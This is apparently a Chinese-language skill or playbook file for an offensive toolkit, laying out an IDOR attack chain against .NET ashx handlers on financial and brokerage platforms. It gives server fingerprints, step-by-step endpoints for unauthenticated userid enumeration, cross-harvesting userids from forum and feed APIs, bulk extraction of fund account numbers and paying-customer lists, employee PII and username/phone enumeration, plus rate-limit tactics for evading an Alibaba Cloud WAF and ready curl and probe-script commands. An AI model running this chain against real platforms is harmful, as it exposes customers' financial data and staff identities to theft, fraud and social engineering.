---
name: 残页·钱门
description: >-
  .NET ashx Handler 金融/投顾/证券平台 IDOR 链：无鉴权 userid 枚举、多子系统交叉收割、
  金融元数据(fundAccount/hasOrder/depositStatus)付费客户批量识别。
  
  通用 IDOR 走 idor-bola-chain；ASP.NET ViewState 走 aspnet-viewstate-hunt。
---

# .NET ashx 金融平台 IDOR 链

## 何时用

- 发现 `.ashx` handler（ASP.NET Web Forms 通用处理程序）
- 参数含 `userid`/`uid` 且为连续自增整数
- 多子域名（user./bbs./api./dynamic./homeapi.）暗示多系统共享用户体系
- 响应含金融字段：`fundAccount`、`hasOrder`、`khAuditStatus`、`depositStatus`

## 指纹

```
Content-Type: ...ashx
Server: Microsoft-IIS
X-Powered-By: ASP.NET
X-AspNet-Version: ...
响应中出现 "userInfo"/"fundAccount"/"hasOrder"
```

## 攻击链

```
Phase 1 — 单点 IDOR 验证
  POST /api/getuserinfo.ashx   userid=1,2,100,1000,10000 (无 token)
  → 返回 userName/gender/fundAccount/hasOrder → IDOR 确认

Phase 2 — 公开系统交叉收割 userid
  GET /api/bbsgetforumlist.ashx → 板块列表 (data[].id)
  GET /api/bbsgetforum.ashx?fid=X&index=N → 帖子列表 (data[].userID)
  GET /api/feed/getfeeduser.ashx?userid=X → 动态列表
  → 大量真实 userid 无鉴权获取

Phase 3 — 定向金融元数据查询
  对 Phase 2 收集的 userid 批量调 getuserinfo.ashx
  筛选 fundAccount.hasOrder==1 → 付费客户名单
  附加: fundAccount(资金账号)、khAuditStatus(开户)、depositStatus(入金)

Phase 4 — 补充接口
  GET /api/Environment/GetEmployee → 员工 PII（姓名/执业编号）
  GET /api/checkUserName.ashx → 用户名枚举（code=21 存在）
  POST /api_wap/ngw/login.ashx → 手机号注册状态枚举
```

## WAF 对抗（阿里云 WAF）

- 安全速率约 5 QPS（间隔 ≥ 0.2s）
- 超限触发 405 源 IP 封禁，约 30 分钟自动解除
- 批量枚举建议 0.3-0.5s 间隔，检测 `blocked` 关键词自动暂停

## 工具

```bash
# 全链探针
python3 炼蛊房/ashx_fintech_idor_probe.py \
  --base https://user.目标.com \
  --bbs https://bbs.目标.com \
  --case <案卷> \
  --out 案卷/<案卷>/harvest/

# 手动单点验证
curl -X POST https://user.目标.com/api/getuserinfo.ashx \
  -d "userid=1" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

## 成功口径

| 级别 | 描述 |
|------|------|
| L1 | 单个 userid IDOR 返回他人资料（userName/gender） |
| L2 | 批量枚举 + hasOrder 识别付费客户名单 + 资金账号暴露 |
| L3 | 订单明细/交易记录获取（需 usertoken 或 H5 逆向） |

## Flutter H5 WebView 注意

- APK dex 通常只有 SDK 桩，业务 API 不在原生代码中
- 订单/支付接口在 H5 页面（m.xxx.com / h5.xxx.com），需运行时抓包
- getuserinfo 返回的 `verifyUrl`/`logoutUrl` 暗示 H5 入口地址

## 不要做

- 全量遍历 2000 万+ userid（取少量样本证明即可）
- 对金融平台执行写操作（下单/提现/改密）
- 把员工 PII 用于社工

## 真源

- Playbook: `传承/残页·钱门.md`
- 探针: `炼蛊房/ashx_fintech_idor_probe.py`
- 案例: `案卷/stockhn_20260902/`
- 通用 IDOR: `杀招/万我·横夺`
